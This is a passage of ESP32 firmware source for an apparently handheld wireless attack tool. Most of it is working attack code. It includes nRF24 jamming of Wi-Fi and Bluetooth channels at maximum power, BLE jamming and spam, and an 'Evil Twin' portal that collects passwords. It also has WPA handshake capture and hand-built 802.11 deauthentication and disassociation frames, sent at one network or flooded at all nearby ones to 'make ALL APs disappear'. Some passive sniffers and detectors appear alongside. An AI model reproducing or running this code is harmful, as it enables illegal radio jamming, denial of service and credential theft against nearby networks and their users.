}

// Management Frame Sniffer with channel hopping
if (mgmtSnifferActive) {
  static unsigned long lastMgmtHop = 0;
  static unsigned long lastMgmtUpdate = 0;
  
  // Fast channel hopping - 150ms per channel
  if (millis() - lastMgmtHop > 150) {
    snifferChannel = (snifferChannel % 13) + 1;
    esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
    lastMgmtHop = millis();
  }
  
  // Update display every 300ms
  if (millis() - lastMgmtUpdate > 300) {
    displayManagementFrameSniffer();
    lastMgmtUpdate = millis();
  }
}

// Beacon Analyzer with channel hopping
if (beaconAnalyzerActive) {
  static unsigned long lastBeaconHop = 0;
  static unsigned long lastBeaconUpdate = 0;
  
  // Channel hopping - 200ms per channel
  if (millis() - lastBeaconHop > 200) {
    snifferChannel = (snifferChannel % 13) + 1;
    esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
    lastBeaconHop = millis();
  }
  
  // Update display every 300ms
  if (millis() - lastBeaconUpdate > 300) {
    displayBeaconAnalyzer();
    lastBeaconUpdate = millis();
  }
}
  // BLE Frame Sniffer with live updates
  if (bleSnifferActive && currentState == BLE_SNIFFER_ACTIVE) {
    static unsigned long lastBLESnifferUpdate = 0;
    
    if (millis() - lastBLESnifferUpdate > 500) {
      displayBLEFrameSniffer();
      lastBLESnifferUpdate = millis();
    }
  }
  // ==================== TURBO MODE: nRF24 JAMMER ONLY - MAXIMUM SPEED ====================
  if (nrfJammerActive && nrfTurboMode) {
    // ⚡ ULTRA-FAST MODE: Touch check only every 100K hops (not every loop!)
    if ((nrfJamPackets % 100000) == 0) {
      uint16_t touchX, touchY;
      if (tft.getTouch(&touchX, &touchY)) {
        // Stop requested
        Serial.println("\n[!] ===== STOP BUTTON PRESSED =====");
        
        nrfJammerActive = false;
        nrfTurboMode = false;
        
        // Stop radios
        if (nrf1Available) {
          radio1.stopConstCarrier();
          radio1.powerDown();
          delay(50);
          radio1.powerUp();
        }
        if (nrf2Available) {
          radio2.stopConstCarrier();
          radio2.powerDown();
          delay(50);
          radio2.powerUp();
        }
        
        Serial.println("[✓] Radios stopped");
        
        // Print final stats
        unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
        if (runtime > 0) {
          Serial.printf("[+] Runtime: %lu sec, Hops: %lu (%lu/sec)\n", 
                        runtime, nrfJamPackets, nrfJamPackets/runtime);
        }
        
        addToConsole("nRF24 stopped");
        
        // Navigate back to menu
        delay(200);
        currentState = NRF_JAM_MENU;
        hoveredIndex = -1;
        tft.fillScreen(COLOR_BG);
        delay(100);
        drawNRFJammerMenu();
        
        Serial.println("[✓] Returned to menu");
        return;
      }
    }

    // Classic BT Frame Sniffer with live updates
    if (btClassicSnifferActive && currentState == BT_CLASSIC_SNIFFER_ACTIVE) {
      static unsigned long lastBTClassicUpdate = 0;
      
      if (millis() - lastBTClassicUpdate > 500) {
        displayBTClassicSniffer();
        lastBTClassicUpdate = millis();
      }
    }

    // Control Frame Sniffer with channel hopping
if (controlSnifferActive) {
  static unsigned long lastControlHop = 0;
  static unsigned long lastControlUpdate = 0;
  
  // Fast channel hopping - 150ms per channel
  if (millis() - lastControlHop > 150) {
    snifferChannel = (snifferChannel % 13) + 1;
    esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
    lastControlHop = millis();
  }
  
  // Update display every 300ms
  if (millis() - lastControlUpdate > 300) {
      displayControlFrameSniffer();
      lastControlUpdate = millis();
    }
  }

  // Data Frame Sniffer with channel hopping
  if (dataSnifferActive) {
    static unsigned long lastDataHop = 0;
    static unsigned long lastDataUpdate = 0;
    
    // Fast channel hopping - 150ms per channel
    if (millis() - lastDataHop > 150) {
      snifferChannel = (snifferChannel % 13) + 1;
      esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
      lastDataHop = millis();
    }
    
    // Update display every 300ms
    if (millis() - lastDataUpdate > 300) {
        displayDataFrameSniffer();
        lastDataUpdate = millis();
      }
    }

    // ⚡⚡⚡ MAXIMUM SPEED JAMMING - Smoochiee's exact method ⚡⚡⚡
    switch (nrfJamMode) {
      case NRF_SWEEP:
        // ⭐ SMOOCHIEE'S SWEEP PATTERN - MAXIMUM SPEED VERSION
        // Radio 1: +4/-4 sweep (fast bouncing pattern)
        nrf_ch1 += (flag_radio1 == 0) ? 4 : -4;
        if (nrf_ch1 > 79) { 
          flag_radio1 = 1; 
          nrf_ch1 = 79; 
        } else if (nrf_ch1 < 2) { 
          flag_radio1 = 0; 
          nrf_ch1 = 2; 
        }
        
        // Radio 2: +2/-2 sweep (slower pattern for offset coverage)
        nrf_ch2 += (flag_radio2 == 0) ? 2 : -2;
        if (nrf_ch2 > 79) { 
          flag_radio2 = 1; 
          nrf_ch2 = 79; 
        } else if (nrf_ch2 < 2) { 
          flag_radio2 = 0; 
          nrf_ch2 = 2; 
        }
        
        // ⚡ CRITICAL: Just change channel - carrier stays ON!
        if (nrf1Available) radio1.setChannel(nrf_ch1);
        if (nrf2Available) radio2.setChannel(nrf_ch2);
        
        // Fast increment (no mutex - speed over thread safety in turbo mode)
        nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available ? 1 : 0);
        break;
        
      case NRF_RANDOM:
        // Random channel hopping (chaotic jamming)
        if (nrf1Available) radio1.setChannel(random(80));
        if (nrf2Available) radio2.setChannel(random(80));
        nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available ? 1 : 0);
        break;
        
      case NRF_FOCUSED:
        // Focus on BLE advertising channels and critical frequencies
        if (nrf1Available) {
          radio1.setChannel(hopping_channel[ptr_hop1]);
          ptr_hop1 = (ptr_hop1 + 1) % 24;
        }
        if (nrf2Available) {
          radio2.setChannel(hopping_channel[ptr_hop2]);
          ptr_hop2 = (ptr_hop2 + 1) % 24;
        }
        nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available ? 1 : 0);
        break;
        
      case NRF_WIFI_CLOWN:
  // âš¡âš¡âš¡ MAXIMUM POWER WiFi Clown V2 - Cifer-Tech Style âš¡âš¡âš¡
  // CRITICAL: Stop carrier, change channel, restart carrier (proper RF-Clown method)
  
  static unsigned long lastWiFiHop = 0;
  unsigned long currentMicros = micros();
  
  // âš¡ FASTER DWELL: 10ms per channel (not 20ms) for more aggressive jamming
  if (currentMicros - lastWiFiHop >= 10000) {  // 10ms = 10000 microseconds
    lastWiFiHop = currentMicros;
    
    // Select current WiFi channel sweep array
    const byte* sweep;
    switch (wifi_jam_mode) {
      case 0: sweep = wifi_ch1_sweep; break;   // WiFi Ch 1 (2412 MHz)
      case 1: sweep = wifi_ch6_sweep; break;   // WiFi Ch 6 (2437 MHz)
      case 2: sweep = wifi_ch11_sweep; break;  // WiFi Ch 11 (2462 MHz)
      default: 
        wifi_jam_mode = 0;
        sweep = wifi_ch1_sweep;
    }
    
    // âš¡âš¡âš¡ CRITICAL FIX: Restart carrier on EACH channel (RF-Clown method) âš¡âš¡âš¡
    
    // === RADIO 1: Stop, Change, Restart Carrier ===
    if (nrf1Available) {
      radio1.stopConstCarrier();           // Stop old carrier
      delayMicroseconds(50);               // Brief pause
      radio1.setChannel(sweep[sweep_index_radio1]);  // New channel
      delayMicroseconds(50);               // Settle time
      radio1.startConstCarrier(RF24_PA_MAX, sweep[sweep_index_radio1]);  // New carrier
      
      sweep_index_radio1 = (sweep_index_radio1 + 1) % 6;  // Next position
    }
    
    // === RADIO 2: Stop, Change, Restart Carrier (offset pattern) ===
    if (nrf2Available && dualNRFMode) {
      radio2.stopConstCarrier();           // Stop old carrier
      delayMicroseconds(50);               // Brief pause
      radio2.setChannel(sweep[sweep_index_radio2]);  // New channel
      delayMicroseconds(50);               // Settle time
      radio2.startConstCarrier(RF24_PA_MAX, sweep[sweep_index_radio2]);  // New carrier
      
      sweep_index_radio2 = (sweep_index_radio2 + 1) % 6;  // Next position (offset)
    }
    
    // Count hops (dual radio gets 2x credit)
    nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available && dualNRFMode ? 1 : 0);
    
    // âš¡ FASTER ROTATION: Switch WiFi channel every 60 hops (~600ms per WiFi channel)
    if ((nrfJamPackets % 60) == 0 && nrfJamPackets > 0) {
      wifi_jam_mode = (wifi_jam_mode + 1) % 3;
      sweep_index_radio1 = 0;
      sweep_index_radio2 = 3;  // Keep offset for dual coverage
      
      // Optional: Print which WiFi channel we're jamming
      if ((nrfJamPackets % 300) == 0) {  // Print every 5th rotation
        const char* channel_name = (wifi_jam_mode == 0) ? "Ch1 (2412MHz)" :
                                   (wifi_jam_mode == 1) ? "Ch6 (2437MHz)" :
                                                           "Ch11 (2462MHz)";
        Serial.printf("[WiFi Clown] Now jamming: %s\n", channel_name);
      }
    }
  }
  break;
    }
    
    // ⚡ Stats every 200K hops (less frequent = faster jamming)
    if ((nrfJamPackets % 200000) == 0 && nrfJamPackets > 0) {
      unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
      if (runtime > 0) {
        unsigned long hopsPerSec = nrfJamPackets / runtime;
        
        Serial.printf("[nRF24] %lu hops | %lu/sec\n", nrfJamPackets, hopsPerSec);
        
        // Performance indicator
        if (hopsPerSec > 150000) {
          Serial.println("        ✅ EXCELLENT - Peak performance!");
        } else if (hopsPerSec > 80000) {
          Serial.println("        ✅ VERY GOOD - Strong jamming");
        } else if (hopsPerSec > 40000) {
          Serial.println("        ✅ GOOD - Working well");
        } else if (hopsPerSec > 20000) {
          Serial.println("        ⚠️ FAIR - Could be better");
        } else {
          Serial.println("        ❌ WEAK - Check hardware!");
        }
      }
      
      esp_task_wdt_reset();  // Feed watchdog only during stats
    }
    
    // ⚡ NO DELAYS, NO YIELDS - return immediately for max speed!
    return;
  }
  
  // ==================== NORMAL MODE: Full UI + Features ====================
  checkHeapHealth();
  
  // RF MONITOR ANIMATION
  if (currentState == RF_MONITOR && selectedRFType == RF_NRF24) {
    static unsigned long lastRFUpdate = 0;
    
    if (millis() - lastRFUpdate > 33) {
      drawRFMonitor();
      lastRFUpdate = millis();
    }
  }
  
  // Real-time attack updates
  if (currentState == WIFI_ATTACK_MENU) {
    static unsigned long lastAttackUpdate = 0;
    if (millis() - lastAttackUpdate > 200) {
      updateAttackMenuLive();
      lastAttackUpdate = millis();
    }
  }
  
  if (currentState == CAPTURED_PASSWORDS) {
    static unsigned long lastPwdUpdate = 0;
    static int lastCredCount = 0;
    if (capturedCredCount != lastCredCount || millis() - lastPwdUpdate > 2000) {
      displayCapturedPasswords();
      lastCredCount = capturedCredCount;
      lastPwdUpdate = millis();
    }
  }
  
  if (currentState == HANDSHAKE_CAPTURE) {
    static unsigned long lastHandshakeUpdate = 0;
    static bool wasCapture = false;
    if (millis() - lastHandshakeUpdate > 300 || 
        (capturedHandshake.captured && !wasCapture)) {
      displayHandshakeCapture();
      wasCapture = capturedHandshake.captured;
      lastHandshakeUpdate = millis();
    }
  }
  
  // Live scanning updates
  if (currentState == DEAUTH_SNIFFER_ACTIVE) {
    static unsigned long lastDeauthUpdate = 0;
    if (millis() - lastDeauthUpdate > 500) {
      displayDeauthSnifferActive();
      lastDeauthUpdate = millis();
    }
  }
  
  if (currentState == AIRTAG_SCANNER || currentState == AIRTAG_RESULTS) {
    static unsigned long lastAirTagUpdate = 0;
    if (millis() - lastAirTagUpdate > 1000) {
      displayAirTagResults();
      lastAirTagUpdate = millis();
    }
  }
  
  if (currentState == SKIMMER_DETECTOR || currentState == SKIMMER_RESULTS) {
    static unsigned long lastSkimmerUpdate = 0;
    if (millis() - lastSkimmerUpdate > 1000) {
      displaySkimmerResults();
      lastSkimmerUpdate = millis();
    }
  }
  
  if (currentState == WARDRIVING_MODE) {
    static unsigned long lastWardrivingUpdate = 0;
    if (millis() - lastWardrivingUpdate > 1000) {
      displayWardrivingResults();
      lastWardrivingUpdate = millis();
    }
  }
  
  if (continuousWiFiScan && currentState == WIFI_SCAN) {
    processWiFiScanResults();
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 500) {
      displayContinuousWiFiScan();
      lastDisplayUpdate = millis();
    }
  }
  
  if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
    if (millis() - lastBLEScanUpdate > 2000) {
      if (pBLEScan != nullptr) {
        BLEScanResults results = pBLEScan->getResults();
        bleDeviceCount = results.getCount();
        if (bleDeviceCount > 50) bleDeviceCount = 50;
        
        for (int i = 0; i < bleDeviceCount; i++) {
          BLEAdvertisedDevice device = results.getDevice(i);
          bleDevices[i].address = device.getAddress().toString().c_str();
          bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
          bleDevices[i].rssi = device.getRSSI();
        }
        
        displayBLEScanResults();
      }
      lastBLEScanUpdate = millis();
    }
  }
  
  // Fast channel hopping sniffer with proper display
  if (snifferActive && currentState == SNIFFER_ACTIVE) {
    static unsigned long lastChannelHop = 0;
    static unsigned long lastSnifferUpdate = 0;
    
    // Fast channel hopping - 200ms per channel (5 channels/sec like Marauder)
    if (millis() - lastChannelHop > 200) {
      snifferChannel = (snifferChannel % 13) + 1;  // Cycle through channels 1-13
      esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
      lastChannelHop = millis();
    }
    
    // Update display every 300ms (smooth without flicker)
    if (millis() - lastSnifferUpdate > 300) {
      displaySnifferActive();
      lastSnifferUpdate = millis();
    }
    
    // Check for handshake capture
    static bool lastCapturedState = false;
    if (capturedHandshake.captured && !lastCapturedState) {
      Serial.println("[+] FULL HANDSHAKE CAPTURED!");
      addToConsole("Handshake captured!");
      lastCapturedState = true;
    }
    if (!capturedHandshake.captured) {
      lastCapturedState = false;
    }
  }
  
  // Deauth sniffer with channel hopping
  if (deauthSnifferActive && currentState == DEAUTH_SNIFFER_ACTIVE) {
    static unsigned long lastChannelHop = 0;
    static unsigned long lastSnifferUpdate = 0;
    
    // Fast channel hopping - 150ms per channel (optimal for deauth detection)
    if (millis() - lastChannelHop > 150) {
      snifferChannel = (snifferChannel % 13) + 1;  // Cycle 1-13
      esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
      lastChannelHop = millis();
    }
    
    // Update display every 300ms
    if (millis() - lastSnifferUpdate > 300) {
      displayDeauthSnifferActive();
      lastSnifferUpdate = millis();
    }
  }

  // Rogue AP detector
  if (rogueAPScanActive && currentState == ROGUE_AP_DETECTOR) {
    processRogueAPScan();
    
    static unsigned long lastRogueDisplay = 0;
    if (millis() - lastRogueDisplay > 1000) {
      displayRogueAPDetector();
      lastRogueDisplay = millis();
    }
  }

  // Deauth flood
  if (deauthFloodActive && currentState == WIFI_BLE_NRF_JAM) {
    performDeauthFlood();
    
    static unsigned long lastFloodDisplay = 0;
    if (millis() - lastFloodDisplay > 300) {
      updateDeauthFloodDisplay();
      lastFloodDisplay = millis();
    }
  }

  // RF Capture
  if (currentState == RF_CAPTURE && rfCaptureActive) {
    performRFCapture();
    
    static unsigned long lastCaptureUpdate = 0;
    if (millis() - lastCaptureUpdate > 500) {
      drawRFCapture();
      lastCaptureUpdate = millis();
    }
  }
  
  // Touch handling
  handleTouch();
  handleSerialCommands();
  
  // Animations
  if (showSkull && millis() - lastAnimTime > 50) {
    animateSkull();
    lastAnimTime = millis();
  }
  
  // Active attacks
  if (deauthActive) {
    performDeauth();
    delayMicroseconds(100);
  }
  
  if (beaconFloodActive) {
    performBeaconFlood();
  }
  
  // BLE operations (only if nRF24 is OFF)
  if (bleJammerActive && !nrfJammerActive) {
    performBLEJam();
    
    if (currentState == BLE_JAM_ACTIVE) {
      static unsigned long lastBLEJamDisplay = 0;
      if (millis() - lastBLEJamDisplay > 500) {
        updateBLEJammerDisplay();
        lastBLEJamDisplay = millis();
      }
    }
  }
  
  // BLE Spam (only if nothing else active)
  if (!nrfJammerActive && !bleJammerActive) {
    if (appleSpamActive && androidSpamActive) {
      // Combined spam mode
      performCombinedSpam();
    } else {
      // Individual spam modes
      if (appleSpamActive) performAppleSpam();
      if (androidSpamActive) performAndroidSpam();
    }
  }
  
  // Captive portal (when not jamming)
  if (portalActive && !bleJammerActive && !nrfJammerActive && !snifferActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  delay(1);
}

void updateAttackMenuLive() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 200) return;
  lastUpdate = millis();
  // Only update if we're actually in the attack menu
  if (currentState != WIFI_ATTACK_MENU) return;
  
  // Calculate positions (must match drawAttackMenu())
  int separatorY = HEADER_HEIGHT + 25 + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING)) + 5;
  int statusY = separatorY + 8;
  int leftColX = SIDE_MARGIN;
  int rightColX = 130;
  
  // ===== UPDATE <Active> INDICATORS ON MENU ITEMS =====
  int menuY = HEADER_HEIGHT + 25;
  for (int i = 0; i < 6; i++) {
    int itemY = menuY + (i * (MENU_ITEM_HEIGHT + MENU_SPACING));
    
    // Clear the indicator area
    tft.fillRect(168, itemY + 5, 72, 14, COLOR_BG);
    
    // Show <Active> if running
    bool showActive = false;
    if (i == 0 && deauthActive && currentDeauthMethod == 0) showActive = true;
    if (i == 1 && deauthActive && currentDeauthMethod == 1) showActive = true;
    if (i == 2 && currentState == HANDSHAKE_CAPTURE) showActive = true;
    if (i == 3 && portalActive) showActive = true;
    
    if (showActive) {
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(170, itemY + 7);
      tft.print("<Active>");
    }
  }
  
  // ===== CLEAR ONLY THE STATUS SECTION (STOP BEFORE BACK BUTTON) =====
  // backY = 305, so clear up to 303 to leave back button untouched
  int clearHeight = 303 - statusY;  // Calculate exact height to back button area
  tft.fillRect(0, statusY - 2, 240, clearHeight, COLOR_BG);
  
  // ===== DRAW LEFT COLUMN STATUS =====
  tft.setTextSize(1);
  
  // Deauth status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY);
  tft.print("Deauth:");
  tft.setCursor(leftColX + 48, statusY);
  tft.setTextColor(deauthActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.print(deauthActive ? "ACTIVE" : "OFF   ");
  
  // Portal status (NO method here)
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 12);
  tft.print("Portal:");
  tft.setCursor(leftColX + 48, statusY + 12);
  tft.setTextColor(portalActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.print(portalActive ? "ACTIVE" : "OFF   ");
  
  // Handshake status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 24);
  tft.print("Handshake:");
  tft.setCursor(leftColX + 60, statusY + 24);
  if (capturedHandshake.captured) {
    static bool justCaptured = false;
    static unsigned long captureTime = 0;
    if (!justCaptured) {
      justCaptured = true;
      captureTime = millis();
    }
    
    bool showText = true;
    if (millis() - captureTime < 3000) {
      showText = (millis() / 250) % 2 == 0;
    } else {
      justCaptured = false;
    }
    
    if (showText) {
      tft.setTextColor(COLOR_GREEN);
      tft.print("YES");
    }
  } else {
    tft.setTextColor(COLOR_TEXT);
    tft.print("NO ");
  }
  
  // Passwords count
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 36);
  tft.print("Passwords:");
  tft.setCursor(leftColX + 60, statusY + 36);
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%-3d", capturedCredCount);
  
  // Show NEW indicator
  static int lastShownCount = 0;
  static unsigned long lastPwdTime = 0;
  if (capturedCredCount > lastShownCount) {
    lastShownCount = capturedCredCount;
    lastPwdTime = millis();
  }
  if (millis() - lastPwdTime < 2000 && capturedCredCount > 0) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 85, statusY + 36);
    tft.print("NEW!");
  }
  
  // ===== RIGHT COLUMN - Active attack details =====
  if (deauthActive) {
    // Packets: label on top, value below (can expand)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, statusY);
    tft.print("Packets:");
    tft.setCursor(rightColX, statusY + 12);  // Value BELOW label
    tft.setTextColor(COLOR_ORANGE);
    tft.printf("%-8d", deauthPacketsSent);
    
    // Method: value on SAME line (ONLY place showing method)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, statusY + 24);
    tft.print("Method:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(rightColX + 42, statusY + 24);  // Value to the right
    tft.print(currentDeauthMethod == 0 ? "Standard" : "Storm   ");
  }
  
  if (portalActive) {
    // Clients: value on SAME line
    int portalY = deauthActive ? statusY + 36 : statusY;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, portalY);
    tft.print("Clients:");
    
    int clientCount = WiFi.softAPgetStationNum();
    tft.setTextColor(clientCount > 0 ? COLOR_GREEN : COLOR_TEXT);
    tft.setCursor(rightColX + 48, portalY);  // Value to the right
    tft.printf("%-2d", clientCount);
    
    // Activity indicator
    if (clientCount > 0) {
      static bool clientBlink = false;
      clientBlink = !clientBlink;
      tft.setTextColor(clientBlink ? COLOR_ORANGE : COLOR_BG);
      tft.setCursor(rightColX + 65, portalY);
      tft.print("*");
    }
  }
  
  // ===== ATTACK STATUS MESSAGE AREA =====
  int msgY = statusY + 60;
  
  // Timer for deauth start message
  static unsigned long deauthStartTime = 0;
  if (deauthActive && deauthStartTime == 0) {
    deauthStartTime = millis();
  }
  if (!deauthActive) {
    deauthStartTime = 0;
  }
  
  // Show attack initiation messages
  if (deauthActive && (millis() - deauthStartTime < 5000)) {  // Show for 5 seconds
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(leftColX, msgY);
    tft.print("> Deauth attack started...");
  } else if (portalActive && WiFi.softAPgetStationNum() == 0) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(leftColX, msgY);
    tft.print("> Evil Twin active       ");
  } else if (capturedHandshake.captured) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX, msgY);
    tft.print("> Handshake captured!    ");
  }
}

// ==================== WiFi Functions ====================

void scanWiFiNetworks() {
  // Start continuous async scan
  continuousWiFiScan = true;
  networkCount = 0;
  scanDisplayOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = WIFI_SCAN;
  addToConsole("AP scan started");
  
  // Start async scan (non-blocking)
  WiFi.scanNetworks(true);  // true = async mode
  
  // Initial display
  displayWiFiScanResults();
}

wifi_ap_record_t targetAP;
bool rogueAPActive = false;



void stopDeauth() {
  deauthActive = false;
  addToConsole("Deauth stopped");
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}
// ==================== FUNCTION 1: startDeauth() - CLEANED ====================
void startDeauth() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    addToConsole("ERROR: No target");
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) {
    addToConsole("ERROR: Target not found");
    return;
  }
  
  // ✅ FIX: Stop conflicting operations with proper delays
  if (snifferActive) {
    stopSniffer();
    delay(200);
  }
  if (portalActive) {
    stopCaptivePortal();
    delay(200);
  }
  if (beaconFloodActive) {
    beaconFloodActive = false;
    delay(100);
  }
  
  // ✅ FIX: Proper WiFi state machine
  Serial.println("[*] Initializing WiFi for deauth...");
  
  // Step 1: Clean shutdown
  esp_wifi_stop();
  delay(200);
  esp_task_wdt_reset();
  
  // Step 2: Set mode to NULL first
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_task_wdt_reset();
  
  // Step 3: Set to AP mode
  WiFi.mode(WIFI_AP);
  delay(200);
  esp_task_wdt_reset();
  
  // Step 4: Start WiFi
  esp_wifi_start();
  delay(200);
  esp_task_wdt_reset();
  
  // Step 5: Set channel
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  
  deauthActive = true;
  deauthPacketsSent = 0;
  
  String methodName = (currentDeauthMethod == 0) ? "Standard" : "Storm";
  addToConsole("Deauth: " + methodName + " on " + selectedSSID);
  
  Serial.printf("[+] Deauth active: %s on %s (Ch %d)\n", 
                methodName.c_str(), selectedSSID.c_str(), networks[targetIndex].channel);
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}

// ==================== FUNCTION 2: performDeauth() - CLEANED ====================
void performDeauth() {
  static unsigned long lastDeauthBurst = 0;
  
  // Find target network
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) return;
  
  uint8_t *bssid = networks[targetIndex].bssid;
  uint8_t channel = networks[targetIndex].channel;
  
  // Ensure correct channel
  static uint8_t lastChannel = 0;
  if (lastChannel != channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    lastChannel = channel;
    delay(10);
  }
  
  // METHOD 0: Standard Deauth (ENHANCED - now sends 5 packets)
  if (currentDeauthMethod == 0) {
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,                         // Deauthentication
      0x3A, 0x01,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // To: Broadcast
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // From: AP
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
      0x00, 0x00,                         // Sequence
      0x02, 0x00                          // Reason code: Previous auth invalid
    };
    
    // Send 5 rapid packets with different reason codes
    const uint8_t reasons[] = {0x01, 0x02, 0x03, 0x06, 0x07};
    for (int i = 0; i < 5; i++) {
      deauthPacket[24] = reasons[i];
      deauthPacket[16] = (i & 0xFF);      // Vary sequence number
      deauthPacket[17] = ((i >> 8) & 0xFF);
      
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(100);
      SAFE_INCREMENT(deauthPacketsSent);
    }
  }
  
  // METHOD 1: Storm Mode (ULTRA AGGRESSIVE - 20 packets)
  else if (currentDeauthMethod == 1) {
    // Burst every 50ms instead of every loop (prevents spam)
    if (millis() - lastDeauthBurst < 50) return;
    lastDeauthBurst = millis();
    
    const uint8_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
    
    // Send 20 packets in rapid burst
    for (int i = 0; i < 20; i++) {
      uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // To: Broadcast
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // From: AP
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
        (uint8_t)(i & 0xFF), (uint8_t)((i >> 8) & 0xFF),  // Unique sequence
        reasons[i % 8], 0x00  // Rotate through reason codes
      };
      
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(50);
      SAFE_INCREMENT(deauthPacketsSent);
      
      // Every 5th packet, also send disassociation
      if (i % 5 == 0) {
        deauthPacket[0] = 0xA0;  // Disassociation frame
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        delayMicroseconds(50);
        SAFE_INCREMENT(deauthPacketsSent);
      }
    }
  }
}

// ==================== startDeauthFlood() ====================
void startDeauthFlood() {
  if (deauthFloodActive) return;
  
  Serial.println("\n========== STARTING MAXIMUM DEAUTH FLOOD ==========");
  
  // Stop ALL conflicting operations
  if (snifferActive) {
    esp_wifi_set_promiscuous(false);
    snifferActive = false;
    delay(100);
  }
  if (portalActive) {
    webServer.stop();
    dnsServer.stop();
    portalActive = false;
    delay(100);
  }
  if (beaconFloodActive) {
    beaconFloodActive = false;
    delay(100);
  }
  if (deauthActive) {
    deauthActive = false;
    delay(100);
  }
  
  // CRITICAL: Complete WiFi reset
  Serial.println("[*] Performing complete WiFi reset...");
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(500);
  esp_task_wdt_reset();
  
  // Restart WiFi stack
  esp_wifi_stop();
  delay(200);
  esp_wifi_deinit();
  delay(200);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  delay(200);
  
  esp_wifi_set_mode(WIFI_MODE_AP);
  delay(200);
  esp_wifi_start();
  delay(200);
  esp_task_wdt_reset();
  
  Serial.println("[*] WiFi stack reinitialized for deauth");
  
  // Load all scanned networks as targets
  deauthTargetCount = 0;
  for (int i = 0; i < networkCount && i < 50; i++) {
    deauthTargets[i].ssid = networks[i].ssid;
    memcpy(deauthTargets[i].bssid, networks[i].bssid, 6);
    deauthTargets[i].channel = networks[i].channel;
    deauthTargets[i].packetsSent = 0;
    deauthTargets[i].active = true;
    deauthTargetCount++;
  }
  
  deauthFloodActive = true;
  deauthFloodPackets = 0;
  lastDeauthFloodUpdate = millis();
  
  currentState = MenuState::WIFI_BLE_NRF_JAM;
  
  Serial.printf("[+] MAXIMUM DEAUTH FLOOD STARTED\n");
  Serial.printf("    Targets: %d networks\n", deauthTargetCount);
  Serial.println("    Mode: ULTRA AGGRESSIVE");
  Serial.println("    - 12 packets per target per burst");
  Serial.println("    - Bidirectional (AP↔Client)");
  Serial.println("    - Multiple reason codes");
  Serial.println("    - Disassociation frames");
  Serial.println("    - Expected: 200-400 pkt/sec");
  Serial.println("    GOAL: Make ALL APs disappear from WiFi list");
  addToConsole("Deauth: MAXIMUM POWER");
  
  displayDeauthFlood();
}

// ==================== stopDeauthFlood() ====================
void stopDeauthFlood() {
  if (!deauthFloodActive) return;
  
  deauthFloodActive = false;
  
